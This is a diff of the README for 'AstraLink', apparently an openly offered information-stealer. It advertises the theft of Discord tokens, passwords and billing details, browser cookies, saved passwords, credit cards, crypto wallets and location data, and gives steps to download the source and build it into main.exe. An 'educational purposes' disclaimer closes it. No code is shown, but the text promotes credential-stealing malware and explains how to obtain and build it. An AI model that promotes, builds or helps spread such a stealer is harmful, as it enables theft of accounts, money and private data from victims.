@@ -1,6 +1,6 @@
 # Guide and Info's about AstraLink!
 <h1 align="center"> Astra Link Information Logger  </h1> 
-https://imgur.com/pL3eguv
+<img src="img/banner.png" width="100%" height="100%" />
 
 
 
@@ -11,7 +11,7 @@ https://imgur.com/pL3eguv
 
 
 
-                                     ⬇ Logging Features ⬇
+                                                            ⬇ Logging Features ⬇
 
 
 -   Discord Information 
@@ -30,18 +30,23 @@ https://imgur.com/pL3eguv
     - Sends token, password, email and billing on login or when the account's data get's modified
 
 
--   Client's Data
-    -   Steam
+-   Client's Data (Coming Soon WIP)
     -   Riot Games
+    -   Epic Games
     -   Telegram
-    -   Nation's Glory
+    -   Steam
 
 
 -   System Information
     -   User
     -   System
     -   Disk
-    -   Network
+    -   IP Address
+    -   MAC Address
+    -   Country
+    -   Region
+    -   City
+    -   ISP
 
 
  -   Authentication Stealer
@@ -94,22 +99,29 @@ https://imgur.com/pL3eguv
     - Youtube
     
 
+- Logs Browser Data such as
+   
+    - Cookies
+    - Passwords
+    - Bookmarks
+    - History
+    - Emails
+    - Phone Numbers 
+    - Credit/Debit Cards
+    - Integrated Plugins Data
+
+- Logs Crypto Wallets:
+
+   - Metamask
+   - Atomic
+   - Exodus
+   - Binance
+   - Coinbase
+   - Trust 
+   - Phantom 
 
 
-
-- Logs Browser Cookies, Passwords, Emails, Phone Numbers and Credit/Debit Cards
-
-
-
-
-
-
-
-
-- Logs Crypto Wallets: Metamask, Atomic, Exodus, Binance, Coinbase, Trust and Phantom 
-
-
-                                 ⬇ Instructions ⬇
+                                                             ⬇ Instructions ⬇
 
 
 1. [Download source code zip](https://github.com/metaversnova/AstraLink/archive/refs/heads/main.zip)
@@ -119,12 +131,8 @@ https://imgur.com/pL3eguv
 5. Follow the instructions and the executable file should be in the ‘’dist’’ folder as ‘’main.exe’’
 
 
-
-<div align="center"><img style="display: block; margin-left: auto; margin-right: auto; width: 65%;" src="></img></div>
-
-
-                                 ⬇ Dependencies ⬇
- 
+                                                               ⬇ Dependencies ⬇
+     
 -   [Python](https://www.python.org/downloads/release/python-3109/)
 -   [Git](https://git-scm.com/download/win)
 
@@ -136,7 +144,7 @@ https://imgur.com/pL3eguv
 </div>
  
  
-                          ⬇ Issues? Volunteer Contributor? ⬇
+                                                         ⬇ Issues? Volunteer Contributor? ⬇
 
 
 * View the [contributing guidelines](CONTRIBUTING.md) for more information on how you can help out.
@@ -144,7 +152,7 @@ https://imgur.com/pL3eguv
 * Reach out to me at any linked platform on https://about.me/metaversenova
 
 
-                              ⬇ Educational Purposes Disclosure ⬇
+                                                       ⬇ Educational Purposes Disclosure ⬇
 
 
 - <bold> This tool is a tool that should be used only for educational purposes. I do not hold any responsibility for any misuse! </bold>
